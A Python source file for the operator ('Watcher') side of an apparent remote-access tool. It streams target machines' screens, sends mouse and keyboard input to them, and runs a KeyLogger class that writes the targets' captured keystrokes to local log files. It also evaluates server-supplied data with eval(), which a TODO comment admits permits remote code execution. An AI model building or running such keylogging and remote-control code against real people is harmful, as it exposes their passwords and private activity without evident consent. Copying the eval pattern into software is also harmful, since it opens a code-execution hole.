from Base.constants import DeviceEvents, Reasons, Actions, \
    ClientTypes, ControlDevice
from Base.settings import SERVER_PORT, SERVER_ADDRESS, \
    ACKNOWLEDGEMENT_ITERATION
from Base.socket_base import Socket, Config
from collections import namedtuple
import logging
import os
from pynput.keyboard import Listener as KeyboardListener, Key, KeyCode
from queue import Queue, Empty
from random import random
from socket import socket
from threading import Lock, Thread
from time import time, sleep
from typing import List, Tuple


class Watcher(Socket):

    def __init__(self):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.running = False
        self.watching = False
        self.config = Config()
        self.target_list: List[str] = []

        self.screen_reader = None
        self.controller = None

        self.request_lock = Lock()

    def start(self):
        """
            Starts watcher
            returns true if started successfully else false
        """
        if self.running:
            logging.warning("Watcher started without stopping it. "
                            "Cannot start again.")
            raise Exception("Watcher started without stopping")
        self.socket.close()  # close socket if already open
        self.socket = self.new_socket()
        logging.info("Starting Watcher")
        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return False
        logging.info("Connected to server")
        self.running = True

        try:
            # send this client's type
            self.send_data(ClientTypes.WATCHER)

            # send this client's unique code
            self.send_data(self.config.code.encode(self.FORMAT))
            ack = self.recv_data()  # receive "OK" or reason
            if ack == Reasons.ALREADY_CONNECTED:
                logging.info("Already connected to server. "
                             "Cannot connect again")
                return False
        except (BrokenPipeError, ConnectionResetError):
            logging.fatal("Connection to server closed unexpectedly. "
                          "Aborting")
            self.stop()
            return False

        Thread(target=self.update_target_list).start()

        return True

    def update_target_list(self):
        """
            Keeps fetching list of targets from Server
        """
        while self.running:
            with self.request_lock:
                self.send_data(Actions.SEND_TARGET_LIST)
                try:
                    target_list = self.recv_data().decode(self.FORMAT)
                except OSError:
                    logging.debug("OSError while getting target list. "
                                  "Aborting")
                    self.running = False
                    break
            if not target_list:
                logging.debug("Main watcher connection closed")
                self.running = False
                break

            """
                TODO: WARNING: Next line is vulnerable and can result in
                    remote code execution. Fix it
            """
            self.target_list = eval(target_list)
            sleep(1)

    def watch(self, target_code):
        """"
            Start screen reader and controller
        """
        self.watching = True
        self.screen_reader = ScreenReader(target_code)
        self.screen_reader.watcher = self
        self.controller = Controller(target_code)
        self.controller.watcher = self
        self.keylogger = KeyLogger(target_code)
        self.keylogger.watcher = self
        Thread(target=self.screen_reader.start).start()
        Thread(target=self.controller.start).start()
        Thread(target=self.keylogger.start).start()
        return True

    def stop_watching(self):
        """
            Send stop watching request to the server
        """
        self.watching = False
        with self.request_lock:
            try:
                self.send_data(Actions.STOP_WATCHING)
            except (BrokenPipeError, ConnectionResetError):
                pass

    def stop(self):
        """
            Stop the main watcher client and all its dependents
            (ScreenReader, Controller, etc.)
        """
        logging.info("Stopping Watcher")
        if self.watching:
            self.stop_watching()
        self.running = False
        self.target_list = []
        self.socket.close()


class ScreenReader(Socket):
    """
        The class with methods to read the target screen
    """

    def __init__(self, target_code: str):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)
        self.target_code = target_code
        self.config = Config()
        self.watcher: Watcher = None

    def start(self):
        """
            Start the screen reader client
        """
        logging.info("Starting Watcher Screen Reader")
        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return
        logging.info("Connected to server")

        try:
            self.send_data(ClientTypes.WATCHER_SCREEN_READER)
            self.send_data(self.config.code.encode(self.FORMAT))
            self.send_data(self.target_code.encode(self.FORMAT))
            self.recv_data().decode(self.FORMAT)  # receive "OK"
        except (BrokenPipeError, ConnectionResetError):
            # logging.debug(traceback.format_exc())
            logging.fatal("Connection to server closed unexpectedly. Aborting")
            self.stop()
            return

        self.running = True
        self.run()

    def run(self):
        """
            keep fetching target screen images
            send acknowledgement at every `ACKNOWLEDGEMENT_ITERATION` iteration
        """
        i = 0
        while self.running and self.watcher.watching:
            try:
                self.img = self.recv_data()
                if not self.img:
                    logging.info("Connection to screen reader "
                                 "closed by server.")
                    break
                i += 1
                if i == ACKNOWLEDGEMENT_ITERATION:
                    self.send_data(b"OK")  # send acknowledgement
                    i = 0
            except (BrokenPipeError, ConnectionResetError):  # disconnected
                # check in the gui if this is running...
                # If not running, Say connection problem
                self.running = False
                logging.info("Screen Reader disconnected from "
                             "server, stopping watching")
                self.watcher.watching = False
                break
        self.stop()

    def stop(self):
        """
            Stop screen reader only
        """
        self.running = False
        self.socket.close()


class Controller(Socket):
    """
        The main controller client.
        All controllers (i.e mouse controller, keyboard controller, etc.) use
        the same socket provided by this main controller. To avoid data races
        they all use `control_lock` (an object of `threading.Lock`).
    """

    def __init__(self, target_code: str):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)
        self.target_code = target_code
        self.control_lock = Lock()
        # self.keyboard_controller = KeyboardController(self.socket,
        #     self.control_lock)
        self.mouse_controller = MouseController(self.socket, self.control_lock)
        self.keyboard_controller = KeyboardController(self.socket,
                                                      self.control_lock)
        self.watcher: Watcher = None
        self.config = Config()

    def start(self):
        """
            Start all the controllers
        """
        logging.info("Starting watcher controller")
        # self.keyboard_controller.start()
        # self.connect()
        # self.send_data(WATCHER_CONTROLLER.encode(self.FORMAT))
        # self.running = True
        # Thread(target=self.run).start()

        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return
        logging.info("Connected to server")

        try:
            self.send_data(ClientTypes.WATCHER_CONTROLLER)
            self.send_data(self.config.code.encode(self.FORMAT))
            self.send_data(self.target_code.encode(self.FORMAT))
            self.recv_data()  # receive b"OK"
        except (BrokenPipeError, ConnectionResetError):
            # logging.debug(traceback.format_exc())
            logging.fatal("Connection to server closed unexpectedly. Aborting")
            self.stop()
            return

        self.mouse_controller.start()
        self.keyboard_controller.start()

        self.running = True
        self.run()

    def run(self):
        """
            Each controller has an update function. All those
            are called here at regular intervals after some delay
        """
        while self.running:
            self.keyboard_controller.update()
            self.mouse_controller.update()
            sleep(0.001)
            self.running = self.watcher.running
        self.stop()

    def stop(self):
        self.running = False
        self.keyboard_controller.stop()
        self.socket.close()


class KeyboardController(Socket):
    """
        The keyboard controller.
    """

    def __init__(self, skt: socket, control_lock: Lock) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT, skt)

        self.listener = None
        self.keys = Queue(0)
        self.control_lock = control_lock

        # `_window_in_focus` and `_keyboard_on` to be set by GUI app
        self._window_in_focus = True
        self._keyboard_on = True

        self._capture_keys = True

    @property
    def window_in_focus(self):
        return self._window_in_focus

    @window_in_focus.setter
    def window_in_focus(self, value: bool):
        self._window_in_focus = value
        self.capture_keys = self._window_in_focus and self._keyboard_on

    @property
    def keyboard_on(self):
        return self._keyboard_on

    @keyboard_on.setter
    def keyboard_on(self, value):
        self._keyboard_on = value
        self.capture_keys = self._window_in_focus and self._keyboard_on

    @property
    def capture_keys(self):
        return self._capture_keys

    @capture_keys.setter
    def capture_keys(self, value):
        self._capture_keys = value
        # self.stop()
        # self.start(self._capture_keys)
        if self.capture_keys:
            self.start()
        else:
            self.stop()

    def start(self, supress=None):
        """
            The key queue is updated every time a key is pressed.
            pynput keyboard listener is used.
        """
        if supress is None:
            logging.info("Starting Keyboard Controller")
            supress = self.capture_keys
        self.listener = KeyboardListener(on_press=self.on_press,
                                         on_release=self.on_release,
                                         suppress=supress)
        self.listener.start()

    def stop(self):
        """
            Stop the pynput keyboard listener
        """
        self.listener.stop()

    def on_press(self, key: Key | KeyCode | None):
        """
            put `vk` value in self.keys
        """
        # logging.debug((self._window_in_focus,
        #     self._keyboard_on, self.capture_keys))
        # print(self.listener.suppress, self.listener._suppress)
        if self.capture_keys:
            if isinstance(key, Key):
                self.keys.put((DeviceEvents.KEY_DOWN, key.value.vk))
                # logging.debug((key.name, key.value.vk,
                #     key.value.combining, key.value.char))
            elif isinstance(key, KeyCode):
                self.keys.put((DeviceEvents.KEY_DOWN, key.vk))
                # logging.debug((key.vk, key.combining, key.char))

    def on_release(self, key):
        if self.capture_keys:
            if isinstance(key, Key):
                self.keys.put((DeviceEvents.KEY_UP, key.value.vk))
                # logging.debug((key.name, key.value))
            elif isinstance(key, KeyCode):
                self.keys.put((DeviceEvents.KEY_UP, key.vk))
                # logging.debug((key.vk, key.combining, key.char))

    def update(self):
        """
            If key queue is not empty, fetch the keys and send to server.
        """
        if not self.keys.empty():
            with self.control_lock:
                event = self.keys.get_nowait()
                self.send_data(str((ControlDevice.CONTROL_KEYBOARD,
                                    *event)).encode(self.FORMAT))

    def get_keys(self):
        """
            Gets keys from queue and returns a list containing the keys
        """
        keys = []
        while not self.keys.empty():
            try:
                keys.append(self.keys.get_nowait())
            except Empty:
                break
        return keys


class MouseController(Socket):
    """
        The mouse controller.
        The clicks queue is updated by the GUI.
    """

    UP = "up"
    DOWN = "down"

    def __init__(self, socket: socket, lock: Lock) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT, socket)
        self.events = Queue(0)
        self.pos: Tuple[int, int] = (0, 0)
        self.control_lock = lock
        self.button_down = False
        self._mouse_on = True
        self.capture_events = True

    @property
    def mouse_on(self):
        pass

    @mouse_on.getter
    def mouse_on(self):
        return self._mouse_on

    @mouse_on.setter
    def mouse_on(self, value):
        self._mouse_on = value
        self.capture_events = self._mouse_on

    def start(self):
        pass

    def update_mouse_pos(self, _, pos):
        """
            Keep updating the mouse position.
        """
        self.pos = pos

    def get_events(self):
        """
            Gets clicks from queue and returns a list containing the clicks
        """
        events = []
        while not self.events.empty():
            events.append(self.events.get_nowait())
        return events

    def update(self):
        """
            Sends only one click at a time
        """

        """ One at a time method """
        # if self.events.empty():
        #     return
        # event = self.events.get_nowait()
        # logging.debug(event)
        # with self.control_lock:
        #     self.send_data(CONTROL_MOUSE.encode(self.FORMAT))
        #     self.send_data(str(event).encode(self.FORMAT))
        #     # self.recv_data()   # Receive acknowledgement

        """ Many at a time method """
        events = self.get_events()
        # logging.debug(events)
        ln = len(events)
        for i, event in enumerate(events):
            events.extend(self.get_events())
            if (i < ln - 1) and \
                    (event[0] == DeviceEvents.MOUSE_MOVE == events[i + 1][0]):
                sleep(0.001)
                continue
            with self.control_lock:
                self.send_data(str((ControlDevice.CONTROL_MOUSE,
                                    *event)).encode(self.FORMAT))
                # self.send_data(ControlDevice.CONTROL_MOUSE)
                # self.send_data(str(event).encode(self.FORMAT))

    def stop(self):
        pass


class KeyLogger(Socket):
    """
        writes all keys pressed to `Logs/KeyLogs/keys<time><random>.txt`
    """

    SPECIAL_KEY = 0x0
    CHARACTER = 0x1

    class LoggedKey(namedtuple("LoggedKey", ["name", "char", "type"])):
        pass

    def __init__(self, target_code: str) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        if not os.path.exists("Logs"):
            os.mkdir("Logs")
        if not os.path.exists("Logs/KeyLogs"):
            os.mkdir("Logs/KeyLogs")

        self.config = Config()
        self.target_code = target_code
        self.watcher: Watcher = None

        self.logfile_path = f"Logs/KeyLogs/keys{time()}_{random()}"

        self.key_to_name = {key: str(key).split(".")[-1] for key in Key}

        from pynput.keyboard._xorg import Listener
        from pynput._util.xorg_keysyms import KEYSYMS, SYMBOLS
        self.SPECIAL_KEYS = Listener._SPECIAL_KEYS
        self.KEYPAD_KEYS: dict[int, KeyCode] = Listener._KEYPAD_KEYS
        self.SPECIAL_KEYS.pop(Key.space.value.vk)

        self.KEYSYMS = KEYSYMS
        self.SYMBOLS = SYMBOLS

    def start(self):
        """
            Start the keylogger. Connect to the server.
        """

        logging.info("Starting keylogger")

        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return

        try:
            self.send_data(ClientTypes.WATCHER_KEYLOGGER)
            self.send_data(self.config.code.encode(self.FORMAT))
            self.send_data(self.target_code.encode(self.FORMAT))
            self.recv_data()  # receive b"OK"
        except (BrokenPipeError, ConnectionResetError):
            logging.fatal("Connection to server closed unexpectedly. Aborting")
            self.stop()
            return

        self.running = True
        # self.vk_log = open(f"{self.logfile_path}.vklog")
        # self.verbose_key_log = open(f"{self.logfile_path}.verbose")
        # self.key_log = open(f"{self.logfile_path}.log")
        with open(f"{self.logfile_path}.vklog", "w") as self.vk_log, \
                open(f"{self.logfile_path}.verbose", "w") as self.verbose_key_log, \
                open(f"{self.logfile_path}.log", "w") as self.key_log:
            self.run()

    def run(self):
        """
            Get vk of the key presses on target side.
        """
        while self.running:
            try:
                vks = self.recv_data()
                if not vks:
                    logging.info("Stopping keylogger")
                    break
                self.log_keys(vks)
            except (ConnectionResetError, BrokenPipeError):
                logging.info("Stoping Keylogger")
                break

        self.stop()

    def parse_vk(self, vk) -> LoggedKey | None:
        """
        Parse the `vk` to get key name and/or its character
        representation if available.
        """
        if self.platform.startswith('linux'):
            if vk in self.SPECIAL_KEYS:
                return self.LoggedKey(self.key_to_name[self.SPECIAL_KEYS[vk]],
                                      None, self.SPECIAL_KEY)
            elif vk in self.KEYPAD_KEYS:
                key = self.KEYPAD_KEYS[vk]
                if isinstance(key, Key):
                    return self.LoggedKey(self.key_to_name[key], None,
                                          self.SPECIAL_KEY)
                return self.LoggedKey(None, key.char, self.CHARACTER)

            name = self.KEYSYMS.get(vk, None)
            if name is None:
                return
            if name not in self.SYMBOLS:
                return self.LoggedKey(name, None, self.CHARACTER)
            char = self.SYMBOLS[name][1]
            return self.LoggedKey(name, char, self.CHARACTER)

    def log_keys(self, vks: bytes):
        """
        Convert vks to keys and log them in files
        """
        vks = " ".join(map(lambda x: str(int.from_bytes(x, "big")),
                           vks.split(b'\0')))
        # logging.debug(vks+" ")

        self.vk_log.write(vks+" ")
        events = iter(vks.split())
        keys = map(lambda key: (int(key[0]), int(key[1])),
                   zip(events, events))
        # logging.debug(keys)
        # map(self.log_key, keys)
        for key in keys:
            self.log_key(key)

    def log_key(self, key: Tuple[str, str]):
        vk = int(key[1])
        k = self.parse_vk(vk)
        # logging.debug(str(k))
        if k is None:
            logging.debug(f"missing key for {vk}")
            return
        if k.type == self.SPECIAL_KEY:
            log = f"[{k.name}]"
        elif k.type == self.CHARACTER:
            log = f"{k.char}"
        else:
            raise ValueError(f"Unknown key type '{k.type}'")
        if key[0] == DeviceEvents.KEY_DOWN:
            logv = f"[{log}]⬇️ "
            self.key_log.write(log)
        elif key[0] == DeviceEvents.KEY_UP:
            logv = f"[{log}]⬆️ "
        else:
            raise ValueError(f"Invalid value '{key[0]}' for Event")
        self.verbose_key_log.write(logv)

    def stop(self):
        self.running = False
        self.socket.close()


if __name__ == "__main__":
    watcher = Watcher()
    try:
        watcher.start()
    except KeyboardInterrupt:
        watcher.stop()
    logging.info("Watcher stopped")
